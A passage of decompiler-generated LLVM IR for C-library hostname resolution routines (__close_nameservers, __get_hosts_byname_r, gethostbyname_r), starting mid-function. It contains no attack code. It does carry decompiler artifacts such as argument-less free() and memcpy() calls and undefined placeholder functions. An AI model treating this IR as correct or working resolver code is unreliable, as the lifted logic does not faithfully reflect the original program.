  uselistorder i32 (i8*, i32)* @__GI_memset, { 22, 24, 25, 3, 26, 21, 4, 5, 20, 27, 12, 18, 19, 40, 39, 23, 0, 13, 6, 7, 8, 9, 10, 11, 14, 15, 16, 1, 2, 36, 37, 38, 17, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 4, 3, 2 }
  uselistorder i32 -35312, { 1, 0 }
  uselistorder i32 1275, { 0, 3, 4, 2, 1 }
  uselistorder i32 -34336, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34336), { 1, 0 }
  uselistorder i32 27492, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_1ceb8, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1ce28, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1cddc, { 1, 0 }
  uselistorder label %dec_label_pc_1cdd4, { 1, 0 }
  uselistorder label %dec_label_pc_1cc98, { 1, 0 }
  uselistorder label %dec_label_pc_1cdb8.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1cb14, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1cf20 = load i32, i32* @r4, align 4
  store i32 %v3_1cf20, i32* %stack_var_-20, align 4
  store i32 27500, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  store i32 -34260, i32* %r3.global-to-local, align 4
  %v4_1cf34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 27500) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34260), i32* %r3.global-to-local, align 4
  store i32 118600, i32* @lr, align 4
  %v1_1cf44 = icmp ne i32 %v4_1cf34, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34260)
  call void @__pseudo_cond_branch(i1 %v1_1cf44, i32 ptrtoint (i32* @global_var_16e04.850 to i32))
  store i32 27504, i32* %r3.global-to-local, align 4
  store i32 27508, i32* @r7, align 4
  store i32 27496, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1cf58 = load i32, i32* @r5, align 4
  %v3_1cf58 = add i32 %v1_1cf58, 27504
  %v4_1cf58 = inttoptr i32 %v3_1cf58 to i32*
  store i32 0, i32* %v4_1cf58, align 4
  %v0_1cf5c = load i32, i32* %r2.global-to-local, align 4
  %v1_1cf5c = load i32, i32* @r5, align 4
  %v2_1cf5c = load i32, i32* %r4.global-to-local, align 4
  %v3_1cf5c = add i32 %v2_1cf5c, %v1_1cf5c
  %v4_1cf5c = inttoptr i32 %v3_1cf5c to i32*
  store i32 %v0_1cf5c, i32* %v4_1cf5c, align 4
  br label %dec_label_pc_1cf74

dec_label_pc_1cf64:                               ; preds = %dec_label_pc_1cf74
  store i32 %v4_1cf88, i32* %r3.global-to-local, align 4
  store i32 %v1_1cf7c, i32* %v3_1cf74, align 4
  %v0_1cf6c = load i32, i32* %r3.global-to-local, align 4
  %v1_1cf6c = load i32, i32* %r2.global-to-local, align 4
  %v4_1cf6c = mul i32 %v1_1cf6c, 4
  %v5_1cf6c = add i32 %v4_1cf6c, %v0_1cf6c
  %v6_1cf6c = inttoptr i32 %v5_1cf6c to i32*
  %v7_1cf6c = load i32, i32* %v6_1cf6c, align 4
  store i32 %v7_1cf6c, i32* @r0, align 4
  %v0_1cf70 = call i32 @free()
  br label %dec_label_pc_1cf74

dec_label_pc_1cf74:                               ; preds = %entry, %dec_label_pc_1cf64
  %v0_1cf74 = load i32, i32* @r5, align 4
  %v1_1cf74 = load i32, i32* @r7, align 4
  %v2_1cf74 = add i32 %v1_1cf74, %v0_1cf74
  %v3_1cf74 = inttoptr i32 %v2_1cf74 to i32*
  %v4_1cf74 = load i32, i32* %v3_1cf74, align 4
  store i32 %v4_1cf74, i32* @r4, align 4
  %v2_1cf78 = icmp eq i32 %v4_1cf74, 0
  %v1_1cf7c = add i32 %v4_1cf74, -1
  store i32 %v1_1cf7c, i32* %r2.global-to-local, align 4
  %v0_1cf80 = load i32, i32* @r6, align 4
  store i32 %v0_1cf80, i32* %r3.global-to-local, align 4
  %v2_1cf88 = add i32 %v0_1cf80, %v0_1cf74
  %v3_1cf88 = inttoptr i32 %v2_1cf88 to i32*
  %v4_1cf88 = load i32, i32* %v3_1cf88, align 4
  br i1 %v2_1cf78, label %dec_label_pc_1cf88, label %dec_label_pc_1cf64

dec_label_pc_1cf88:                               ; preds = %dec_label_pc_1cf74
  store i32 %v4_1cf88, i32* @r0, align 4
  %v0_1cf8c = call i32 @free()
  %v0_1cf90 = load i32, i32* @r4, align 4
  %v1_1cf90 = load i32, i32* @r5, align 4
  %v2_1cf90 = load i32, i32* @r6, align 4
  %v3_1cf90 = add i32 %v2_1cf90, %v1_1cf90
  %v4_1cf90 = inttoptr i32 %v3_1cf90 to i32*
  store i32 %v0_1cf90, i32* %v4_1cf90, align 4
  %v2_1cf98 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1cf98, i32* %r4.global-to-local, align 4
  ret i32 %v0_1cf8c

; uselistorder directives
  uselistorder i32 %v4_1cf88, { 1, 0 }
  uselistorder i32 %v1_1cf7c, { 1, 0 }
  uselistorder i32* %v3_1cf74, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 27496, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 27508, { 1, 2, 4, 3, 0 }
  uselistorder i32 27504, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -34260, { 1, 2, 0, 3 }
  uselistorder i32 27500, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_1cf74, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_1cfb8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1cff4 = call i32 @__read_etc_hosts_r()
  store i32 %v0_1cfb8, i32* @lr, align 4
  ret i32 %v0_1cff4
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1d00c = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1d018 = load i32, i32* @r0, align 4
  store i32 %v0_1d018, i32* @sl, align 4
  %v2_1d018 = icmp eq i32 %v0_1d018, 0
  %v2_1d01c = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1d01c, align 4
  %v0_1d020 = load i32, i32* @r1, align 4
  store i32 %v0_1d020, i32* @r7, align 4
  %v0_1d024 = load i32, i32* @r3, align 4
  store i32 %v0_1d024, i32* @r6, align 4
  br i1 %v2_1d018, label %bb, label %dec_label_pc_1d030

bb:                                               ; preds = %entry
  %v1_1d028 = load i32, i32* @r5, align 4
  %v2_1d028 = add i32 %v1_1d028, 22
  store i32 %v2_1d028, i32* @r5, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d030:                               ; preds = %entry
  %v0_1d030 = call i32 @__GI___errno_location()
  store i32 %v0_1d030, i32* %r0.global-to-local, align 4
  %v3_1d034 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d034, i32* %ip.global-to-local, align 4
  %v1_1d038 = inttoptr i32 %v0_1d030 to i32*
  %v2_1d038 = load i32, i32* %v1_1d038, align 4
  store i32 %v2_1d038, i32* @r8, align 4
  %v0_1d03c = load i32, i32* @r5, align 4
  store i32 %v0_1d03c, i32* %v1_1d038, align 4
  %v0_1d040 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1d030, i32* @r4, align 4
  %v0_1d050 = load i32, i32* @sl, align 4
  store i32 %v0_1d050, i32* %r0.global-to-local, align 4
  %v0_1d054 = load i32, i32* @r7, align 4
  store i32 %v0_1d054, i32* %r2.global-to-local, align 4
  store i32 %v0_1d00c, i32* %r3.global-to-local, align 4
  %v0_1d05c = load i32, i32* @r6, align 4
  %v7_1d064 = call i32 @__get_hosts_byname_r(i32 %v0_1d050, i32 2, i32 %v0_1d054, i32 %v0_1d00c, i32 %v0_1d05c, i32 %v0_1d040, i32 %tmp18)
  store i32 %v7_1d064, i32* %r0.global-to-local, align 4
  store i32 %v7_1d064, i32* @r5, align 4
  %v2_1d068 = icmp eq i32 %v7_1d064, 0
  br i1 %v2_1d068, label %bb34, label %dec_label_pc_1d074

bb34:                                             ; preds = %dec_label_pc_1d030
  %v1_1d06c = load i32, i32* @r8, align 4
  %v2_1d06c = load i32, i32* @r4, align 4
  %v3_1d06c = inttoptr i32 %v2_1d06c to i32*
  store i32 %v1_1d06c, i32* %v3_1d06c, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d074:                               ; preds = %dec_label_pc_1d030
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1d078 = inttoptr i32 %tmp18 to i32*
  %v2_1d078 = load i32, i32* %v1_1d078, align 4
  store i32 %v2_1d078, i32* %r3.global-to-local, align 4
  %v7_1d07c = icmp eq i32 %v2_1d078, 1
  br i1 %v7_1d07c, label %dec_label_pc_1d098, label %dec_label_pc_1d084

dec_label_pc_1d084:                               ; preds = %dec_label_pc_1d074
  %v7_1d084 = icmp eq i32 %v2_1d078, 4
  br i1 %v7_1d084, label %dec_label_pc_1d0b8, label %dec_label_pc_1d08c

dec_label_pc_1d08c:                               ; preds = %dec_label_pc_1d084
  %v3_1d08c = icmp eq i32 %v2_1d078, -1
  br i1 %v3_1d08c, label %dec_label_pc_1d0ac, label %dec_label_pc_1d2ec

dec_label_pc_1d098:                               ; preds = %dec_label_pc_1d074
  %v7_1d098 = icmp eq i32 %v7_1d064, 2
  br i1 %v7_1d098, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1d098
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1d0c0

.thread4:                                         ; preds = %dec_label_pc_1d098
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1d0c0

dec_label_pc_1d0ac:                               ; preds = %dec_label_pc_1d08c
  %v0_1d0ac = load i32, i32* @r4, align 4
  %v1_1d0ac = inttoptr i32 %v0_1d0ac to i32*
  %v2_1d0ac = load i32, i32* %v1_1d0ac, align 4
  store i32 %v2_1d0ac, i32* %r3.global-to-local, align 4
  %v7_1d0b0 = icmp eq i32 %v2_1d0ac, 2
  br i1 %v7_1d0b0, label %dec_label_pc_1d0b8, label %dec_label_pc_1d2ec

dec_label_pc_1d0b8:                               ; preds = %dec_label_pc_1d0ac, %dec_label_pc_1d084
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d0c0

dec_label_pc_1d0c0:                               ; preds = %.thread4, %bb35, %dec_label_pc_1d0b8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1d0b8 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1d0c8 = load i32, i32* @r8, align 4
  %v1_1d0c8 = load i32, i32* @r4, align 4
  %v2_1d0c8 = inttoptr i32 %v1_1d0c8 to i32*
  store i32 %v0_1d0c8, i32* %v2_1d0c8, align 4
  %v0_1d0cc = load i32, i32* @sl, align 4
  %v1_1d0cc = inttoptr i32 %v0_1d0cc to i8*
  store i32 %v0_1d0cc, i32* %r0.global-to-local, align 4
  %v0_1d0d0 = load i32, i32* @r3, align 4
  %v1_1d0d0 = load i32, i32* @ip, align 4
  %v2_1d0d0 = inttoptr i32 %v1_1d0d0 to i32*
  store i32 %v0_1d0d0, i32* %v2_1d0d0, align 4
  %v3_1d0d4 = call i32 @strlen(i8* %v1_1d0cc)
  store i32 %v3_1d0d4, i32* %r0.global-to-local, align 4
  %v1_1d0d8 = add i32 %v3_1d0d4, 1
  store i32 %v1_1d0d8, i32* @r4, align 4
  %v0_1d0dc = load i32, i32* @r6, align 4
  %v7_1d0e0 = icmp sgt i32 %v0_1d0dc, %v1_1d0d8
  br i1 %v7_1d0e0, label %dec_label_pc_1d0e4, label %dec_label_pc_1d2e8

dec_label_pc_1d0e4:                               ; preds = %dec_label_pc_1d0c0
  %v0_1d0e4 = load i32, i32* @sl, align 4
  store i32 %v0_1d0e4, i32* @r1, align 4
  store i32 %v1_1d0d8, i32* @r2, align 4
  store i32 %v0_1d00c, i32* @r0, align 4
  %v0_1d0f0 = call i32 @memcpy()
  store i32 %v0_1d0f0, i32* %r0.global-to-local, align 4
  %v1_1d0f8 = load i32, i32* @r4, align 4
  %v2_1d0f8 = add i32 %v1_1d0f8, %v0_1d00c
  %v1_1d0fc = sub i32 0, %v2_1d0f8
  %v1_1d100 = load i32, i32* @r6, align 4
  %v2_1d100 = sub i32 %v1_1d100, %v1_1d0f8
  store i32 %v2_1d100, i32* %r2.global-to-local, align 4
  %v1_1d104 = urem i32 %v1_1d0fc, 4
  store i32 %v1_1d104, i32* %r3.global-to-local, align 4
  %v2_1d108 = sub i32 %v2_1d100, %v1_1d104
  store i32 %v2_1d108, i32* @sb, align 4
  %v1_1d10c = add i32 %v2_1d108, -8
  store i32 %v1_1d10c, i32* @r5, align 4
  %v7_1d114 = icmp slt i32 %v1_1d10c, 256
  br i1 %v7_1d114, label %dec_label_pc_1d2e8, label %dec_label_pc_1d118

dec_label_pc_1d118:                               ; preds = %dec_label_pc_1d0e4
  %v2_1d118 = add i32 %v1_1d104, %v2_1d0f8
  store i32 %v2_1d118, i32* @fp, align 4
  store i32 %v0_1d00c, i32* %ip.global-to-local, align 4
  %v1_1d120 = add i32 %v2_1d118, 8
  store i32 %v1_1d120, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1d128 = add i32 %v2_1d118, 16
  store i32 %v1_1d128, i32* @r8, align 4
  %v4_1d12c = inttoptr i32 %v2_1d118 to i32*
  store i32 %v0_1d00c, i32* %v4_1d12c, align 4
  %v0_1d130 = load i32, i32* @sl, align 4
  store i32 %v0_1d130, i32* %r0.global-to-local, align 4
  %v0_1d134 = load i32, i32* @r4, align 4
  %v1_1d134 = load i32, i32* @fp, align 4
  %v2_1d134 = add i32 %v1_1d134, 4
  %v3_1d134 = inttoptr i32 %v2_1d134 to i32*
  store i32 %v0_1d134, i32* %v3_1d134, align 4
  %v0_1d138 = load i32, i32* @r8, align 4
  %v2_1d13c = inttoptr i32 %v0_1d130 to i8*
  %v3_1d13c = call i32 @inet_aton(i8* %v2_1d13c, i32 %v0_1d138)
  store i32 %v3_1d13c, i32* %r0.global-to-local, align 4
  %v1_1d140 = load i32, i32* @r4, align 4
  %v9_1d140 = icmp eq i32 %v3_1d13c, %v1_1d140
  br i1 %v9_1d140, label %dec_label_pc_1d184, label %dec_label_pc_1d148

dec_label_pc_1d148:                               ; preds = %dec_label_pc_1d118
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1d14c = load i32, i32* @r7, align 4
  %v2_1d14c = add i32 %v1_1d14c, 8
  %v3_1d14c = inttoptr i32 %v2_1d14c to i32*
  store i32 2, i32* %v3_1d14c, align 4
  %v0_1d150 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d150 = mul i32 %v0_1d150, 2
  %v1_1d154 = load i32, i32* @r7, align 4
  %v2_1d154 = add i32 %v1_1d154, 12
  %v3_1d154 = inttoptr i32 %v2_1d154 to i32*
  store i32 %v2_1d150, i32* %v3_1d154, align 4
  %v3_1d158 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d158, i32* %r2.global-to-local, align 4
  store i32 %v0_1d00c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1d164 = load i32, i32* @r4, align 4
  store i32 %v0_1d164, i32* @r5, align 4
  %v0_1d168 = load i32, i32* @r8, align 4
  %v1_1d168 = load i32, i32* @fp, align 4
  %v2_1d168 = add i32 %v1_1d168, 8
  %v3_1d168 = inttoptr i32 %v2_1d168 to i32*
  store i32 %v0_1d168, i32* %v3_1d168, align 4
  %v0_1d16c = load i32, i32* @r7, align 4
  %v1_1d16c = load i32, i32* %r2.global-to-local, align 4
  %v2_1d16c = inttoptr i32 %v1_1d16c to i32*
  store i32 %v0_1d16c, i32* %v2_1d16c, align 4
  %v0_1d170 = load i32, i32* @r7, align 4
  %v1_1d170 = inttoptr i32 %v0_1d170 to i32*
  %v2_1d170 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1d170, i32* %v1_1d170, align 4
  %v3_1d170 = add i32 %v0_1d170, 4
  %v4_1d170 = inttoptr i32 %v3_1d170 to i32*
  %v5_1d170 = load i32, i32* @fp, align 4
  store i32 %v5_1d170, i32* %v4_1d170, align 4
  %v0_1d174 = load i32, i32* @r6, align 4
  %v1_1d174 = load i32, i32* @r7, align 4
  %v2_1d174 = add i32 %v1_1d174, 16
  %v3_1d174 = inttoptr i32 %v2_1d174 to i32*
  store i32 %v0_1d174, i32* %v3_1d174, align 4
  %v0_1d178 = load i32, i32* @r4, align 4
  %v1_1d178 = load i32, i32* @ip, align 4
  %v2_1d178 = inttoptr i32 %v1_1d178 to i32*
  store i32 %v0_1d178, i32* %v2_1d178, align 4
  %v0_1d17c = load i32, i32* @r4, align 4
  %v1_1d17c = load i32, i32* @r6, align 4
  %v2_1d17c = add i32 %v1_1d17c, 4
  %v3_1d17c = inttoptr i32 %v2_1d17c to i32*
  store i32 %v0_1d17c, i32* %v3_1d17c, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d184:                               ; preds = %dec_label_pc_1d118
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1d188 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1d188, label %dec_label_pc_1d1a0, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1d184
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1d078, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d1a0:                               ; preds = %dec_label_pc_1d184
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1d1ac = load i32, i32* @sl, align 4
  store i32 %v0_1d1ac, i32* %r0.global-to-local, align 4
  %v2_1d1b4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1d1b4, i32* %r2.global-to-local, align 4
  %v2_1d1b8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1d1b8, i32* %r3.global-to-local, align 4
  %v7_1d1c4 = inttoptr i32 %v0_1d1ac to i8*
  %v8_1d1c4 = call i32 @__dns_lookup(i8* %v7_1d1c4, i32 1, i32 %v2_1d1b4, i32 %v2_1d1b8)
  store i32 %v8_1d1c4, i32* %r0.global-to-local, align 4
  %v1_1d1c8 = icmp slt i32 %v8_1d1c4, 0
  br i1 %v1_1d1c8, label %.thread, label %dec_label_pc_1d1e0

.thread:                                          ; preds = %dec_label_pc_1d1a0
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1d078, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d1e0:                               ; preds = %dec_label_pc_1d1a0
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1d1e4 = icmp eq i32 %tmp12, 1
  br i1 %v7_1d1e4, label %dec_label_pc_1d1ec, label %dec_label_pc_1d2c4

dec_label_pc_1d1ec:                               ; preds = %dec_label_pc_1d1e0
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_1d204 = load i32, i32* @r5, align 4
  %v2_1d204 = add i32 %v0_1d204, -12
  store i32 %v2_1d204, i32* @r8, align 4
  %v8_1d204 = icmp slt i32 %v2_1d204, 0
  br i1 %v8_1d204, label %bb37, label %dec_label_pc_1d210

bb37:                                             ; preds = %dec_label_pc_1d1ec
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1d2d4

dec_label_pc_1d210:                               ; preds = %dec_label_pc_1d1ec
  %v0_1d210 = load i32, i32* @r6, align 4
  store i32 %v0_1d210, i32* @r1, align 4
  %v2_1d214 = add i32 %v0_1d210, 12
  store i32 %v2_1d214, i32* @r0, align 4
  %v2_1d218 = call i32 @memmove(i32 %v2_1d214, i32 %v0_1d210)
  %v0_1d21c = load i32, i32* @fp, align 4
  %v1_1d21c = add i32 %v0_1d21c, 4
  store i32 %v1_1d21c, i32* @r3, align 4
  %v1_1d220 = load i32, i32* @r4, align 4
  %v2_1d220 = add i32 %v1_1d220, %v1_1d21c
  store i32 %v2_1d220, i32* @r5, align 4
  store i32 %v2_1d220, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1d230 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1d23c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1d23c

dec_label_pc_1d23c:                               ; preds = %dec_label_pc_1d23c, %dec_label_pc_1d210
  %v0_1d23c = phi i32 [ %v0_1d23c.pre, %dec_label_pc_1d210 ], [ %v1_1d240, %dec_label_pc_1d23c ]
  %v1_1d23c = load i32, i32* @r6, align 4
  %v7_1d23c = inttoptr i32 %v1_1d23c to i32*
  store i32 %v0_1d23c, i32* %v7_1d23c, align 4
  %v0_1d240 = load i32, i32* @r5, align 4
  %v1_1d240 = add i32 %v0_1d240, 4
  store i32 %v1_1d240, i32* @r5, align 4
  %v0_1d244 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d244 = add i32 %v0_1d244, 1
  store i32 %v1_1d244, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1d244, 0
  br i1 %tmp38, label %dec_label_pc_1d23c, label %dec_label_pc_1d254

dec_label_pc_1d254:                               ; preds = %dec_label_pc_1d23c
  %v3_1d254 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1d254, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1d25c = icmp eq i32 %v3_1d254, 0
  %v1_1d260 = load i32, i32* @r6, align 4
  %v5_1d260 = mul i32 %v1_1d244, 4
  %v6_1d260 = add i32 %v1_1d260, %v5_1d260
  %v7_1d260 = inttoptr i32 %v6_1d260 to i32*
  store i32 0, i32* %v7_1d260, align 4
  br i1 %v2_1d25c, label %dec_label_pc_1d290, label %dec_label_pc_1d268

dec_label_pc_1d268:                               ; preds = %dec_label_pc_1d254
  %v0_1d268 = load i32, i32* @r4, align 4
  %v1_1d268 = inttoptr i32 %v0_1d268 to i8*
  store i32 %v0_1d268, i32* %r0.global-to-local, align 4
  %v3_1d26c = call i32 @strlen(i8* %v1_1d268)
  store i32 %v3_1d26c, i32* %r0.global-to-local, align 4
  %v0_1d270 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1d270, %v3_1d26c
  br i1 %tmp, label %dec_label_pc_1d278, label %dec_label_pc_1d290

dec_label_pc_1d278:                               ; preds = %dec_label_pc_1d268
  %v0_1d278 = load i32, i32* @r4, align 4
  store i32 %v0_1d278, i32* @r1, align 4
  %v0_1d27c = load i32, i32* @r5, align 4
  store i32 %v0_1d27c, i32* %r0.global-to-local, align 4
  %v2_1d280 = inttoptr i32 %v0_1d27c to i8*
  %v3_1d280 = call i32 @strcpy(i8* %v2_1d280, i32 %v0_1d278)
  store i32 %v3_1d280, i32* %r0.global-to-local, align 4
  %v0_1d284 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1d290

dec_label_pc_1d290:                               ; preds = %dec_label_pc_1d268, %dec_label_pc_1d254, %dec_label_pc_1d278
  %storemerge1 = phi i32 [ %v0_1d284, %dec_label_pc_1d278 ], [ %v0_1d00c, %dec_label_pc_1d268 ], [ %v0_1d00c, %dec_label_pc_1d254 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1d294 = load i32, i32* @r7, align 4
  %v2_1d294 = add i32 %v1_1d294, 8
  %v3_1d294 = inttoptr i32 %v2_1d294 to i32*
  store i32 2, i32* %v3_1d294, align 4
  %v0_1d298 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d298 = mul i32 %v0_1d298, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1d2a0 = load i32, i32* @r7, align 4
  %v2_1d2a0 = add i32 %v1_1d2a0, 12
  %v3_1d2a0 = inttoptr i32 %v2_1d2a0 to i32*
  store i32 %v2_1d298, i32* %v3_1d2a0, align 4
  %v3_1d2a4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d2a4, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1d2ac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1d2ac, i32* @r5, align 4
  %v0_1d2b0 = load i32, i32* @r7, align 4
  %v2_1d2b0 = inttoptr i32 %v3_1d2a4 to i32*
  store i32 %v0_1d2b0, i32* %v2_1d2b0, align 4
  %v0_1d2b4 = load i32, i32* @r7, align 4
  %v1_1d2b4 = inttoptr i32 %v0_1d2b4 to i32*
  %v2_1d2b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1d2b4, i32* %v1_1d2b4, align 4
  %v3_1d2b4 = add i32 %v0_1d2b4, 4
  %v4_1d2b4 = inttoptr i32 %v3_1d2b4 to i32*
  %v5_1d2b4 = load i32, i32* @fp, align 4
  store i32 %v5_1d2b4, i32* %v4_1d2b4, align 4
  %v0_1d2b8 = load i32, i32* @r6, align 4
  %v1_1d2b8 = load i32, i32* @r7, align 4
  %v2_1d2b8 = add i32 %v1_1d2b8, 16
  %v3_1d2b8 = inttoptr i32 %v2_1d2b8 to i32*
  store i32 %v0_1d2b8, i32* %v3_1d2b8, align 4
  %v0_1d2bc = load i32, i32* %r3.global-to-local, align 4
  %v1_1d2bc = load i32, i32* %r2.global-to-local, align 4
  %v2_1d2bc = inttoptr i32 %v1_1d2bc to i32*
  store i32 %v0_1d2bc, i32* %v2_1d2bc, align 4
  br label %dec_label_pc_1d2d4

dec_label_pc_1d2c4:                               ; preds = %dec_label_pc_1d1e0
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1d078, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1d2d4

dec_label_pc_1d2d4:                               ; preds = %bb37, %dec_label_pc_1d290, %dec_label_pc_1d2c4
  %v3_1d2d4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1d2d4, i32* @r0, align 4
  %v0_1d2d8 = call i32 @free()
  %v3_1d2dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d2dc, i32* @r0, align 4
  %v0_1d2e0 = call i32 @free()
  store i32 %v0_1d2e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d2e8:                               ; preds = %dec_label_pc_1d0c0, %dec_label_pc_1d0e4
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1d2ec

dec_label_pc_1d2ec:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1d0ac, %dec_label_pc_1d08c, %dec_label_pc_1d2d4, %dec_label_pc_1d148, %dec_label_pc_1d2e8
  %v0_1d2ec = load i32, i32* @r5, align 4
  store i32 %v0_1d2ec, i32* %r0.global-to-local, align 4
  ret i32 %v0_1d2ec

; uselistorder directives
  uselistorder i32 %v0_1d268, { 1, 0 }
  uselistorder i32 %v1_1d244, { 1, 0, 2 }
  uselistorder i32 %v1_1d240, { 1, 0 }
  uselistorder i32 %v0_1d210, { 1, 0, 2 }
  uselistorder i32 %v2_1d204, { 1, 0 }
  uselistorder i32 %v1_1d104, { 2, 1, 0 }
  uselistorder i32 %v1_1d0f8, { 1, 0 }
  uselistorder i32 %v0_1d0cc, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1d078, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1d018, { 1, 0 }
  uselistorder i32 %v0_1d00c, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
